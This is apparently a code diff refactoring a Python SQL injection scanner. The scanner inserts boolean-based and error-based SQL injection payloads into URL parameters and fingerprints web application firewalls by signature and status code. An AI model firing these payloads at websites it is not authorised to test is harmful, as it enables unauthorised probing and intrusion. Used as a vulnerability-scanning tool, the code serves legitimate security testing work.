@@ -7,22 +7,26 @@ import re
 import difflib
 import random
 import time
+from typing import List, Dict
+from setting import user_agent
 
 
-class Sqli:
+class SqlInjection:
     def __init__(self, targets):
-        self.targets = targets
+        self.targets: List = targets
         self.target = ''
         self.results = []
         self.flag_inserted_urls = []
         self.waf = ''
-        self.headers = {'user-agent': '"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-                                      ' (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36"'}
+        self.headers = {'user-agent': user_agent}
         self.rand_num = str(random.randint(100, 999))
-        self.payload = {' and {}={}'.format(self.rand_num, self.rand_num): ' and {}=0'.format(self.rand_num),
-                        "' and '{}'='{}".format(self.rand_num, self.rand_num): "' and '{}'='0".format(self.rand_num)
-                        }
-        self.error_based_payload = "AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('{}',(SELECT 1),'{}','x'))s), 0,0 )))".format(self.rand_num, self.rand_num)
+        self.payload = {
+            ' and {}={}'.format(self.rand_num, self.rand_num): ' and {}=0'.format(self.rand_num),
+            "' and '{}'='{}".format(self.rand_num, self.rand_num): "' and '{}'='0".format(self.rand_num)
+        }
+        self.error_based_payload = "AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('{}',(SELECT 1),'{}','x'))s), 0,0 )))".format(
+            self.rand_num, self.rand_num)
+
         self.waf_rule = {
             '安全狗': 'www.safedog.cn',
             '360webscan': 'safe.webscan.360.cn',
@@ -33,7 +37,8 @@ class Sqli:
             '云盾': 'yundun',
             '深空Web': '深空Web应用',
             '玄武盾': '玄武盾',
-            }
+        }
+
         self.status_code_error = {
             999: "360主机",
             500: "服务器错误!",
@@ -77,6 +82,7 @@ class Sqli:
         return True if self.waf else False
 
     def insert_payload_flag(self):
+        self.flag_inserted_urls = []
         '''
         insert flag to each param
 
@@ -89,10 +95,10 @@ class Sqli:
         flag = 'insert_payload_here'
         if '&' in self.target:
             for param in self.target.split('&'):
-                url = self.target.replace(param, param+flag)
+                url = self.target.replace(param, param + flag)
                 self.flag_inserted_urls.append(url)
         else:
-            self.flag_inserted_urls.append(self.target+flag)
+            self.flag_inserted_urls.append(self.target + flag)
 
     def bool_based_scan(self):
         for inserted_url in self.flag_inserted_urls:
@@ -120,8 +126,9 @@ class Sqli:
                 return self.target
         return False
 
+    # TODO
     def time_based_scan(self):
-        print('todo, maybe not')
+        pass
 
     def scan(self):
         print('sql注入检测')
@@ -129,8 +136,8 @@ class Sqli:
             self.init()
             if '?' in self.target:
                 self.insert_payload_flag()
-                # result = self.bool_based_scan() or self.error_based_scan()
-                result = self.error_based_scan()
+                result = self.bool_based_scan()
+                # result = self.error_based_scan()
                 if result:
                     print('可能存在注入:' + result)
                     self.results.append(result)
